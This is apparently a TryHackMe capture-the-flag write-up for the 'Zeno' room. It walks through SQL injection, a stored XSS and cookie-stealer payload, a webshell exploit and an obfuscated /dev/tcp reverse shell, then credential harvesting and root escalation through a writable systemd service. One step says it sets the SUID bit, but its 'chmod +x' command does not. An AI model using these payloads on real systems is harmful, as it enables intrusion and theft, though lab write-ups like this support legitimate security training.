##### Room Name: [Zeno](https://tryhackme.com/room/zeno)
##### Difficulty: Medium
##### Room Description: Do you have the same patience as the great stoic philosopher Zeno? Try it out!
---

## Enumeration

There was some problem with nmap and because of that it wasn't able to show all the open ports. [Rushi](https://iamrushi.cf/) suggested to me that I use Rustscan.
### Rustscan

![img-rustscan](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/rustscan.png)

Found few more ports. So now I redid the nmap scan on these ports:
```js
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519)
12340/tcp open     http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
22582/tcp filtered unknown
22622/tcp filtered unknown
```

### The web server
Directory busting:
```js
/index.html (Status: 200)
/rms (Status: 301)
```
/index.html does not return anything useful. /rms is Restaurant Management System.
After exploring the website with burp proxy on in the background, I have found a few parameterized requests.
We can do SQLi in the delete order query:
` http://10.10.200.163:12340/rms/delete-order.php?id=0' or 1-- - `

### sqlmap
We have time based SQLi. After some time, here is the info:
* Database Name: dbrms
* Found some tables: 
  
![img-sqlmap-tables](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/sqlmap-tables.png)


I couldn't find anything useful from the database. And it takes a lot of time. So let's see if there's other vulnerabilities.
The website displays the username(first-name). Try checking for xss and SSTI
Could not find SSTI but it has stored XSS. Set the payload to ` ${{4*4}}<img src=x onerror=alert(1)> `

![img-stored-xss](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/stored-xss.png)

Let's see if we can steal the cookies of other users. Upload a cookie stealer payload this time.
![img-cookie-stealer](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/cookie-stealer.png)

Now I logged in with this account and, did some actions on the website in hopes of getting a hit by other users so that I can grab their cookies. I did not get any hits. So its safe to say that there's no other user that would visit my profile. Let's check for other exploits.

### Searching for exploits:
Search for Restaurant Management System exploits in searchsploit.

![img-rms-exploit](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/rms-exploit.png)

We get a webshell uploaded. Use the `?cmd= param` for command execution.

Use this payload in URL encoded form:
`echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNC43OC84MCAwPiYxCg==|base64 -d|bash`

The payload after url encoding will be:
```
%65%63%68%6f%20%4c%32%4a%70%62%69%39%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4e%43%34%78%4e%43%34%33%4f%43%38%34%4d%43%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68
```

### Got a shell. Now what?

After getting a shell, I found a config file `/var/www/html/rms/connection/config.php` that contains passwords.

```php
bash-4.2$ pwd
/var/www/html/rms/connection
bash-4.2$ cat config.php 
<?php
    define('DB_HOST', 'localhost');
    define('DB_USER', 'root');
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');
    define('DB_DATABASE', 'dbrms');
    define('APP_NAME', 'Pathfinder Hotel');
    error_reporting(1);
?>
```

### Mysql database enumeration

In the database, there is a table named `members`. It contains some password hashes and answer hashes. I cracked a few of them

Here are the cracked hashes and passwords:
```md
Username|Email|Password|Security Answer
Stephen|omolewastephen@gmail.com|1234|deborah
john|jsmith@sample.com|jsmith123|middlename
edward|edward@zeno.com|COULD NOT CRACK|COULD NOT CRACK
```

I tried these passwords on edward's account but couldn't login.

### Linpeas
Now let's run Linpeas

![img-linpeas](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/linpeas.png)

We have write privileges on `/etc/systemd/system/zeno-monitoring.service`
Also found new creds.
username=**zeno**,password=**FrobjoodAdkoonceanJa**

Tried `sudo -l` with this password but it did not work.
Let's try editing the service file

### Service file misconfiguration to root

Let's add the SUID bit on `/bin/bash` for an easy privesc. Change the ExecStart to the following as shown below:
```
ExecStart=/usr/bin/chmod +x /bin/bash
```

![img-zeno-service](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/zeno-service.png)

Now when this service starts again, we will have a SUID `/bin/bash`. We can make that happen if we can somehow restart it. But we don't have permissions to do that as a low privileged user. Another way to make it happen is if we can somehow reboot the system.
I tried to reboot the system but couldn't. It required root privileges to reboot.

Let's try the password found earlier (`FrobjoodAdkoonceanJa`) on user `edward`. We successfully login as edward 🎉
Checking for `sudo -l` permissions on edward, we see that he can reboot the system.

![img-edward-sudo](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/edward-sudo.png)

Reboot the machine with `sudo /usr/sbin/reboot` and now when the system is fully rebooted, login as edward through ssh. We now have a SUID `/bin/bash`. Use it to escalate privileges to **root**

![img-root](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/Zeno/images/root.png)

